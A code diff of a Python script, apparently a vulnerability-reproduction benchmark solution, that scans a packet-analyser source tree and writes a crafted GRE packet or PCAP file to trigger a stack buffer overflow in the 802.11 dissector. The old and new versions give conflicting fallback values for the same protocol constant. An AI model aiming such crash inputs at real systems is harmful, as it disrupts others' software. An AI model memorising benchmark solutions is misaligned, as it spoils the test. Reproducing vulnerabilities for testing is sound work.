@@ -1,136 +1,115 @@
 import os
 import re
 import struct
-import tarfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in the 802.11 dissector
-        via GRE encapsulation.
+        Generate a PoC that triggers the vulnerability.
         
-        Strategies:
-        1. Scan the source code to find the GRE protocol type ID that maps to the 802.11 dissector.
-        2. Construct a valid Ethernet + IP + GRE packet.
-        3. Set the GRE protocol type to the found ID.
-        4. Set GRE flags/version to 0 (which is passed as 'data' pointer to 802.11 dissector, causing stack issue).
-        5. Return the raw packet bytes.
+        The vulnerability involves the 802.11 dissector being called from the GRE dissector.
+        We need to find the protocol integer value used to register 802.11 within GRE.
+        Then we construct a PCAP file using DLT_WIRESHARK_UPPER_PDU to feed a GRE packet
+        directly to the GRE dissector.
         """
         
-        defines = {}
-        candidates = []
+        # 1. Scan source code to find the GRE protocol value for 802.11
+        gre_proto_val = self._find_gre_wlan_proto_val(src_path)
         
-        # Regex to capture #define definitions
-        re_define = re.compile(r'^\s*#\s*define\s+([A-Za-z0-9_]+)\s+(0x[0-9a-fA-F]+|\d+)')
-        # Regex to capture dissector_add_uint("gre.proto", <id>, <handle>)
-        re_gre_add = re.compile(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z0-9_]+)\s*,\s*([A-Za-z0-9_]+)\s*\)')
+        # Fallback if not found (0x2452 is ETHERTYPE_IEEE_802_11, often used)
+        if gre_proto_val is None:
+            gre_proto_val = 0x2452
 
-        def process_content(content):
-            for line in content.splitlines():
-                # Extract defines
-                m_def = re_define.search(line)
-                if m_def:
-                    name, val = m_def.groups()
+        # 2. Generate the PCAP file
+        return self._generate_pcap(gre_proto_val)
+
+    def _find_gre_wlan_proto_val(self, src_path):
+        macro_map = {}
+        gre_registrations = []
+
+        # Walk through the source tree
+        for root, dirs, files in os.walk(src_path):
+            for file in files:
+                if file.endswith(('.c', '.h')):
+                    path = os.path.join(root, file)
                     try:
-                        defines[name] = int(val, 0)
-                    except ValueError:
-                        pass
-                
-                # Extract gre.proto registrations
-                m_add = re_gre_add.search(line)
-                if m_add:
-                    pid, handle = m_add.groups()
-                    candidates.append((pid, handle))
+                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                            content = f.read()
 
-        # Scan the source tarball or directory
-        if os.path.isfile(src_path) and any(src_path.endswith(ext) for ext in ['.tar.gz', '.tgz', '.tar']):
-            try:
-                with tarfile.open(src_path, 'r:*') as tar:
-                    for member in tar.getmembers():
-                        if member.isfile() and member.name.endswith(('.c', '.h')):
-                            try:
-                                f = tar.extractfile(member)
-                                if f:
-                                    content = f.read().decode('utf-8', errors='ignore')
-                                    process_content(content)
-                            except Exception:
-                                pass
-            except Exception:
-                pass
-        elif os.path.isdir(src_path):
-            for root, dirs, files in os.walk(src_path):
-                for file in files:
-                    if file.endswith(('.c', '.h')):
-                        try:
-                            with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
-                                process_content(f.read())
-                        except Exception:
-                            pass
+                            # Extract #defines: #define NAME value
+                            # handle potential parens e.g. #define FOO (0x123)
+                            defines = re.findall(r'#define\s+([A-Za-z0-9_]+)\s+\(?\s*(0x[0-9a-fA-F]+|\d+)\s*\)?', content)
+                            for name, val in defines:
+                                if '0x' in val.lower():
+                                    macro_map[name] = int(val, 16)
+                                else:
+                                    macro_map[name] = int(val)
 
-        # Resolve the GRE protocol ID for 802.11
-        target_id = 0x88B7  # Fallback: ETHERTYPE_IEEE_802_11 common value
-        found = False
-        
-        # Look for handles containing 'wlan' or '80211'
-        for pid_str, handle_str in candidates:
+                            # Extract dissector registrations: dissector_add_uint("gre.proto", VAL, handle)
+                            # We capture the value (or macro name) and the handle name
+                            regs = re.findall(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z0-9_]+|0x[0-9a-fA-F]+)\s*,\s*([A-Za-z0-9_]+)\s*\)', content)
+                            for val_str, handle_str in regs:
+                                gre_registrations.append((val_str, handle_str))
+
+                    except IOError:
+                        continue
+
+        # Process registrations to find the one for WLAN/802.11
+        candidate_vals = []
+        for val_str, handle_str in gre_registrations:
             if 'wlan' in handle_str.lower() or '80211' in handle_str.lower():
-                val = None
-                if pid_str.startswith('0') or pid_str.isdigit():
-                    try:
-                        val = int(pid_str, 0)
-                    except ValueError:
-                        pass
-                elif pid_str in defines:
-                    val = defines[pid_str]
-                
-                if val is not None:
-                    target_id = val
-                    found = True
-                    break
-        
-        # Fallback check for known constant name
-        if not found and "ETHERTYPE_IEEE_802_11" in defines:
-            target_id = defines["ETHERTYPE_IEEE_802_11"]
+                candidate_vals.append(val_str)
 
-        # Construct Packet
-        # Length aim: 45 bytes (matches ground truth)
-        # Ethernet (14) + IP (20) + GRE (4) + Payload (7) = 45 bytes
+        # Resolve the value
+        for val_str in candidate_vals:
+            if val_str.startswith('0x'):
+                return int(val_str, 16)
+            elif val_str.isdigit():
+                return int(val_str)
+            elif val_str in macro_map:
+                return macro_map[val_str]
         
-        # 1. Ethernet Header (14 bytes)
-        # Dst MAC (6), Src MAC (6), EtherType (2)
-        eth = struct.pack("!6s6sH", b'\x00'*6, b'\x00'*6, 0x0800) # IP
+        # If no registration found, look for ETHERTYPE_IEEE_802_11 definition directly
+        if 'ETHERTYPE_IEEE_802_11' in macro_map:
+            return macro_map['ETHERTYPE_IEEE_802_11']
+
+        return None
+
+    def _generate_pcap(self, gre_proto_val):
+        # Construct a PCAP with LinkType = 252 (DLT_WIRESHARK_UPPER_PDU)
+        # This allows us to specify the "gre" dissector directly without IP headers.
         
-        # 2. IP Header (20 bytes)
-        payload_len = 7
-        total_ip_len = 20 + 4 + payload_len
+        # Global Header
+        # Magic (4), Major(2), Minor(2), Zone(4), Sig(4), Snap(4), Link(4)
+        # Magic: 0xa1b2c3d4 (Big Endian logic usually implies native read, we use standard LE for x86)
+        global_header = struct.pack('<IHHIIII', 
+            0xa1b2c3d4, 
+            2, 4, 
+            0, 0, 
+            65535, 
+            252 # DLT_WIRESHARK_UPPER_PDU
+        )
+
+        # Upper PDU Header
+        # Tag: Dissector Name (0x000C)
+        # Length: 4 (length of "gre\0")
+        # Value: "gre\0"
+        pdu_tag = struct.pack('>HH4s', 0x000C, 4, b'gre\x00')
         
-        # Calculate checksum
-        # Structure: VerIHL(1), TOS(1), TotalLen(2), ID(2), FlagsFrag(2), TTL(1), Proto(1), Checksum(2), Src(4), Dst(4)
-        ip_header_temp = struct.pack("!BBHHHBBH4s4s", 
-                                     0x45, 0, total_ip_len, 0, 0, 64, 47, 0, 
-                                     b'\x7f\x00\x00\x01', b'\x7f\x00\x00\x01')
+        # GRE Header + Payload
+        # GRE Flags/Ver: 0x0000
+        # GRE Protocol: gre_proto_val (Big Endian)
+        # Payload: 1 byte (sufficient to trigger the dissector call)
+        gre_packet = struct.pack('>HH', 0, gre_proto_val) + b'\x00'
         
-        s = 0
-        for i in range(0, len(ip_header_temp), 2):
-            w = (ip_header_temp[i] << 8) + ip_header_temp[i+1]
-            s += w
-        s = (s >> 16) + (s & 0xffff)
-        s += (s >> 16)
-        chk = ~s & 0xffff
-        
-        ip = struct.pack("!BBHHHBBH4s4s", 
-                         0x45, 0, total_ip_len, 0, 0, 64, 47, chk, 
-                         b'\x7f\x00\x00\x01', b'\x7f\x00\x00\x01')
-        
-        # 3. GRE Header (4 bytes)
-        # Flags/Version (2 bytes) = 0x0000. 
-        #   This value (0) is passed as the 'data' pointer to the 802.11 dissector.
-        #   The 802.11 dissector treats it as a pointer to a larger pseudoheader struct.
-        #   Reading/writing based on this usually triggers the crash.
-        # Protocol (2 bytes) = target_id (Triggers 802.11 dissector)
-        gre = struct.pack("!HH", 0x0000, target_id)
-        
-        # 4. Payload (7 bytes)
-        payload = b'\x00' * payload_len
-        
-        return eth + ip + gre + payload
+        packet_data = pdu_tag + gre_packet
+
+        # Packet Header
+        # TS(4), TS(4), CapLen(4), OrigLen(4)
+        pkt_header = struct.pack('<IIII', 
+            0, 0, 
+            len(packet_data), 
+            len(packet_data)
+        )
+
+        return global_header + pkt_header + packet_data
